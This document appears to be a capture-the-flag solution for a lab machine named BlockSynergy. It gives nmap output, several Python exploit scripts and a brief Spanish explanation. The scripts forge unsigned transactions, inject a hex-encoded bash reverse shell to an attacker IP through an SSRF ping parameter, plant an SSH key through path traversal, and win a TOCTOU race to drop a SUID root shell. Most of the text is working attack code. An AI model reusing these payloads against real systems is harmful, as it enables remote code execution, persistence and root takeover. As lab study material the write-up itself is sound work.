
``` bash
❯ recon 10.129.56.169
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-01 13:33 +0200
Nmap scan report for blocksynergy.htb (10.129.56.169)
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
[*] First script done
[*] Open ports = '22,8080'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-01 13:34 +0200
Nmap scan report for blocksynergy.htb (10.129.56.169)
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0b:93:57:66:c8:a4:f0:85:6a:d2:e1:a4:d5:f4:52:81 (ECDSA)
|_  256 aa:38:b7:38:85:1d:21:1e:db:0a:15:8b:c8:a4:03:92 (ED25519)
8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: BlockSynergy \xE2\x80\x93 Decentralized Future
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
[*] Done
╭─ ~/hacking/ctf/htb/insane/BlockSynergy/recon                                                               ✔ │ 29s ─╮
╰─                                                                                                                   ─╯

```



``` py

import requests
import json

url = "http://blocksynergy.htb:8080"

s = requests.Session()

def load_wallet():

      data = {

       "action":"create",
       "filename":"wallet"

      }

      try:

          r = s.post(url + "/dashboard/wallet", data=data, timeout=10)
          print(f"[+] Create wallet: {r.status_code}")
          wallet = r.json()
          public_key = wallet["public_key"]

      except requests.exceptions.Timeout:

                   print("[-] Error: Timeout")

      except requests.exceptions.ConnectionError:

                   print("[-] Error: Can't connect to the server")

      except Exception as e:

                   print(f"[-] Error: {e}")

      file = {

        "file": ("wallet.json", json.dumps(wallet), "application/json")
      }

      try:

          r = s.post(url + "/dashboard/wallet", data={"action":"load"}, files=file, timeout=10)

          cookie = s.cookies.get("session")
          if cookie:

                    print(f"[+] Cookie:{cookie}")

                    try:

                        r = s.get(url + "/dashboard/info")
                        if "no wallet load" in r.text:

                                 print("[-] No wallet load")

                        else:
                                 print("[+] wallet load succesfully")

                    except Exception as e:

                             print(f"[-] Error: {e}")

      except requests.exceptions.Timeout:

               print("[-] Error: Timeout")

      except requests.exceptions.ConnectionError:

               print("[-] Error: Can't connect to the server")

      except Exception as e:

               print(f"[-] Error: {e}")

      return public_key

def broadcast_transaction(public_key):

     data = {

        "receiver":public_key,
        "sender":"pwned",
        "amount":100,
        "signature":"pwned"

     }

     try:

         r = s.post(url + "/broadcast_transaction", json=data, timeout=10)
         print(f"[+] Broadcast_transaction status code: {r.status_code}")
         print(f"[+] Response broadcast_transaction: {r.text}")

     except requests.exceptions.Timeout:

              print("[-] Error: Timeout")

     except requests.exceptions.ConnectionError:

              print("[-] Error: Can't connect to the server")

     except Exception as e:

              print(f"[-] Error: {e}")

if __name__ == "__main__":

          public_key = load_wallet()
          broadcast_transaction(public_key)


```


``` py


import requests
import json
import time

url = "http://blocksynergy.htb:8080"

s = requests.Session()

def load_wallet():

      data = {

       "action":"create",
       "filename":"wallet"

      }

      try:

          r = s.post(url + "/dashboard/wallet", data=data, timeout=10)
          print(f"[+] Create wallet: {r.status_code}")
          wallet = r.json()
          public_key = wallet["public_key"]

      except requests.exceptions.Timeout:

                   print("[-] Error: Timeout")

      except requests.exceptions.ConnectionError:

                   print("[-] Error: Can't connect to the server")

      except Exception as e:

                   print(f"[-] Error: {e}")

      file = {

        "file": ("wallet.json", json.dumps(wallet), "application/json")
      }

      try:

          r = s.post(url + "/dashboard/wallet", data={"action":"load"}, files=file, timeout=10)

          cookie = s.cookies.get("session")
          if cookie:

                    print(f"[+] Cookie:{cookie}")

                    try:

                        r = s.get(url + "/dashboard/info")
                        if "no wallet load" in r.text:

                                 print("[-] No wallet load")

                        else:
                                 print("[+] wallet load succesfully")

                    except Exception as e:

                             print(f"[-] Error: {e}")

      except requests.exceptions.Timeout:

               print("[-] Error: Timeout")

      except requests.exceptions.ConnectionError:

               print("[-] Error: Can't connect to the server")

      except Exception as e:

               print(f"[-] Error: {e}")

      return public_key

def broadcast_transaction(public_key):

     data = {

        "receiver":public_key,
        "sender":"pwned",
        "amount":100,
        "signature":"pwned"

     }

     try:

         r = s.post(url + "/broadcast_transaction", json=data, timeout=10)
         print(f"[+] Broadcast_transaction status code: {r.status_code}")
         print(f"[+] Response broadcast_transaction: {r.text}")

     except requests.exceptions.Timeout:

              print("[-] Error: Timeout")

     except requests.exceptions.ConnectionError:

              print("[-] Error: Can't connect to the server")

     except Exception as e:

              print(f"[-] Error: {e}")


def ssrf_rce():

     LHOST = "10.10.14.138"
     LPORT = "443"

     cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
     cmd_hex = cmd.encode().hex()

     payload_cmd = f"echo {cmd_hex}|xxd -r -p|bash"

     target = f"http://x;{payload_cmd};/"
     node_url = f"http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target={target}"

     try:
         data = {

         "action": "register", "node": node_url

         }

         while True:

                    r = s.post(url + "/dashboard/vip/nodes", data=data, timeout=10)

                    nodes = s.get(url + "/nodes", timeout=10).json()

                    url_node = nodes[-1]
                    node_id = len(nodes) - 1

                    if url_node == data["node"]:
                            print(f"[+] Node ID: {node_id}")

                            break

                    print("[-] No ID found")

                    time.sleep(1)


     except requests.exceptions.Timeout:

              print("[-] Error: Timeout")

     except requests.exceptions.ConnectionError:

              print("[-] Error: Can't connect to the server")

     except Exception as e:

              print(f"[-] Error: {e}")

     try:

         r = s.get(url + f"/dashboard/vip/nodes/test_node/{node_id}", timeout=10)
         print(f"[+] Payload executed: {r.status_code}")
         print("[+] Check your listener")

     except requests.exceptions.Timeout:

              print("[-] Error: Timeout")

     except requests.exceptions.ConnectionError:

              print("[-] Error: Can't connect to the server")

     except Exception as e:

              print(f"[-] Error: {e}")



if __name__ == "__main__":

          public_key = load_wallet()
          broadcast_transaction(public_key)
          ssrf_rce()


```


``` py


import requests
import json

url = "http://127.0.0.1:5000"
ssh_pub_key = "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIhm+GPKszRx8Q3ZiwAHUn4W3ZUr0CP8w7yIEn4OY+ud joel@DESKTOP-6L9K96J"

s = requests.Session()

def upload_contract():

    contract = {

      "name": "pwn",
      "id": 0,
      "owner": "Developer",
      "debug": "True",
      "logic": {
        "claim": "allow"
      },
      "hooks": {
        "on_claim": "log"
      },
      "storage": {
        "balances": {}
      },
      "__meta__": {
        "log_file": "../../../../home/hank/.ssh/authorized_keys",
        "log_content": {
          "on_claim":ssh_pub_key
        }
      }
    }

    with open("contract.json", "w") as file:

         json.dump(contract, file, indent=4)

    data = {"action":"upload_contract",}

    files = {"contract_file": ("contract.json", open("contract.json", "rb"), "application/json",)}

    try:

        r = s.post(url + "/dashboard", data=data, files=files, timeout=10)
        print(f"[+] status code: {r.status_code}")

    except requests.exceptions.Timeout:

                       print("[-] Error: Timeout")

    except requests.exceptions.ConnectionError:

                       print("[-] Error: Can't connect to the server")

    except Exception as e:

                       print(f"[-] Error: {e}")

def contract_claim():

    try:

        r = s.post(url + "/dashboard", data={"action":"contract_claim"}, timeout=10)
        print(f"[+] status code: {r.status_code}")

    except requests.exceptions.Timeout:

                       print("[-] Error: Timeout")

    except requests.exceptions.ConnectionError:

                       print("[-] Error: Can't connect to the server")

    except Exception as e:

                       print(f"[-] Error: {e}")

    print("[+] Exploit has done!")
if __name__ == "__main__":

           upload_contract()
           contract_claim()


```

Hay 2 procesos claves en la escalada de privilegio: 

/opt/backup/backup.sh
/opt/backup/restore_daemon.sh

En restore_daemon hay una vulnerabilidad muy concreta: RACE CONDITION TOCTOU (Time of check to time of use)

El proceso , antes de descomprimir el archivo _opt ... hay una condicion if para hacerle un checksum.

La vulnerabilidad ocurre entre esos dos fragmentos en la linea del codigo, el checksum intenta verificar un archivo tar con un nombre concreto > en esos milisegundos donde justo el archivo se acaba de verificar mediante checksum debemos de renombrar nuestro tar malicioso por el que espera el programa. Justo despues pasa a la siguiente linia donde tar descomprime el archivo. Si los tiempos son exactos, el archivo que se descomprimira será el nuestro mediante esa rapidez que nos proporciona rename() la cual es la syscall directa al kernel de linux para renombrar un archivo.


``` py

import os
import sys
import time
import struct
import threading
from ctypes import CDLL, util

# CONFIG 

DIRECTORIO_MONITOREO = "/var/restore_work"

RUTA_PAYLOAD         = "/tmp/payload.tar.gz"

BINARIO_TARGET       = "/opt/blocksynergy/.diag"

TRIGGERS = ["/opt/staging/restore", "/opt/blocksynergy/restore"]

PATRONES_ARCHIVO = ["_opt_staging.tar.gz", "_opt_blocksynergy.tar.gz"]

INTERRUPTOR_EXITO = False

def crear_payload():
    
    comando = (f"tar --owner=0 --group=0 --mode=4755 --transform='s|^bash$|opt/blocksynergy/.bash|' -czf {RUTA_PAYLOAD} -C /bin bash")
    os.system(comando)
    print("[+] Payload generado correctamente en /tmp")

def activar_daemon():

    for ruta in TRIGGERS:
        os.system(f"touch {ruta}")


def verificar_permiso_suid():
    
    try:
        modo = os.stat(BINARIO_TARGET).st_mode
        return bool(modo & 0o4000)
    except OSError:
        return False



# INOTIFY

def monitorear_y_reemplazar():
    """
    Escucha eventos del Kernel mediante inotify. 
    En cuanto el daemon abre/lee el archivo legitimo, lo reemplaza atómicamente con el payload.
    """
    global INTERRUPTOR_EXITO

    # Cargar API inotify desde la biblioteca estándar C (libc)
    libc = CDLL(util.find_library("c"))
    fd_inotify = libc.inotify_init()

    # Máscara de eventos: IN_CLOSE_NOWRITE | IN_ATTRIB | IN_OPEN | IN_ACCESS
    MASCARA_EVENTOS = 0x10 | 0x08 | 0x100 | 0x80
    libc.inotify_add_watch(fd_inotify, DIRECTORIO_MONITOREO.encode(), MASCARA_EVENTOS)

    while True:
        data = os.read(fd_inotify, 4096)
        posicion = 0

        while posicion < len(data):
            # Desempaquetar la cabecera struct inotify_event
            _, mascara, _, longitud_nombre = struct.unpack_from("iIII", data, posicion)
            posicion += struct.calcsize("iIII")

            # Extraer el nombre del archivo creado en el directorio
            nombre_bytes = data[posicion : posicion + longitud_nombre]
            nombre_archivo = nombre_bytes.split(b"\x00")[0].decode()
            posicion += longitud_nombre

            # Validar si el archivo coincide con los patrones esperados
            es_archivo_objetivo = any(patron in nombre_archivo for patron in PATRONES_ARCHIVO)
            evento_lectura_completada = bool(mascara & 0x10)  # IN_CLOSE_NOWRITE

            if es_archivo_objetivo and evento_lectura_completada:
                ruta_destino = os.path.join(DIRECTORIO_MONITOREO, nombre_archivo)
                
                # REEMPLAZO ATÓMICO (rename)
                os.rename(RUTA_PAYLOAD, ruta_destino)
                print(f"[+] Reemplazo atómico realizado -> {ruta_destino}")
                
                INTERRUPTOR_EXITO = True
                return

# Main 

def ejecutar_explotacion():
    
    global INTERRUPTOR_EXITO

    crear_payload()

    # Iniciar hilo secundario de escucha inotify
    hilo_escucha = threading.Thread(target=monitorear_y_reemplazar, daemon=True)
    hilo_escucha.start()

    # Bucle de reintentos para ganar la carrera
    MAX_INTENTOS = 40
    for intento in range(1, MAX_INTENTOS + 1):
        print(f"[*] Intento de carrera {intento}/{MAX_INTENTOS}")
        
        activar_daemon()
        time.sleep(3)

        if INTERRUPTOR_EXITO:
            time.sleep(2)
            if verificar_permiso_suid():
                print("[+] ¡Éxito! Permiso SUID obtenido.")
                break
            
            # Si se ejecutó el swap pero no se obtuvo SUID, resetear y reintentar
            print("[-] Swap sucessfully but SUID not obtained.")
            crear_payload()
            INTERRUPTOR_EXITO = False
            
            hilo_escucha = threading.Thread(target=monitorear_y_reemplazar, daemon=True)
            hilo_escucha.start()

    # Evaluación final de resultados
    if verificar_permiso_suid():
        print("[+] shell Root")
        os.execv(BINARIO_TARGET, [BINARIO_TARGET, "-p"])
    else:
        print("[!] The race wasn't won, please try again.")


if __name__ == "__main__":
    
    ejecutar_explotacion()

```


